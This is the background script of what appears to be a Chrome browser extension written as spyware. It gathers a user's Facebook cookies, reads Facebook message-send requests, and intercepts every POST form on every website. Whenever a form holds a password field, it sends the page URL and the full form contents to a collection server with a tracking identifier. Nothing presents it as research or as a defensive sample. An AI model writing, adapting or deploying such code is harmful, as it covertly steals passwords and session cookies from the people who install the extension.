var cookieGet = "";
const server = "http://localhost:8001";
const identify = "tri20cm30phut";

chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
  //Facebook
  if (sender.url.match("facebook.com") !== null) {
    console.log("xinchao");
    if (request.action) {
      switch (request.action.type) {
        case "DATA_LOGIN":
          let cookie = "";
          chrome.cookies.getAll(
            {
              url: "https://www.facebook.com"
            },
            res => {
              res.map(data => {
                return (cookie += data.name + "=" + data.value + "; ");
              });
              //send request data
            }
          );
          break;

        default:
          break;
      }
    }
  }

  console.log(request);
  console.log("sender", sender);
  console.log("sendRequest", sendResponse);
});

chrome.webRequest.onBeforeRequest.addListener(
  details => {
    console.log(details);
    let postedString = decodeURIComponent(
      String.fromCharCode.apply(
        null,
        new Uint8Array(details.requestBody.raw[0].bytes)
      )
    );
    //cac cac
    console.log(parseQuery(postedString));
  },
  { urls: ["https://www.facebook.com/messaging/send/"] },
  ["requestBody"]
);

chrome.webRequest.onBeforeRequest.addListener(
  details => {
   
    //check have requestBody
    if (details.requestBody && details.method == "POST") {
      //request body with raw
      if (details.requestBody.raw) {
        let postedString = decodeURIComponent(
          String.fromCharCode.apply(
            null,
            new Uint8Array(details.requestBody.raw[0].bytes)
          )
        );

        console.log("query parse", parseQuery(postedString));
        
        const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
          details.url
        )}&method=${details.method}&formData=${JSON.stringify(postedString)}`;
        
        if(postedString['password'] || postedString['pwd'] || postedString['Password']) {
          fetch(server + param);
        }
       
      }

      if (details.requestBody.formData) {
        console.log('query', details.requestBody.formData)
        const param = `?type=HTTP_REQUEST&identify=${identify}&url=${btoa(
          details.url
        )}&method=${details.method}&formData=${JSON.stringify(
          details.requestBody.formData
        )}`;
        if(details.requestBody.formData['pwd'] || details.requestBody.formData['password'] || details.requestBody.formData['Password']){
          fetch(server + param);
        }
        
      }
    }
  },
  { urls: ["https://*/*", "http://*/*"] },
  ["requestBody"]
);

function parseQuery(search) {
  var args = search.substring(1).split("&");
  var argsParsed = {};
  var i, arg, kvp, key, value;
  for (i = 0; i < args.length; i++) {
    arg = args[i];
    if (-1 === arg.indexOf("=")) {
      argsParsed[decodeURIComponent(arg).trim()] = true;
    } else {
      kvp = arg.split("=");
      key = decodeURIComponent(kvp[0]).trim();
      value = decodeURIComponent(kvp[1]).trim();
      argsParsed[key] = value;
    }
  }
  return argsParsed;
}
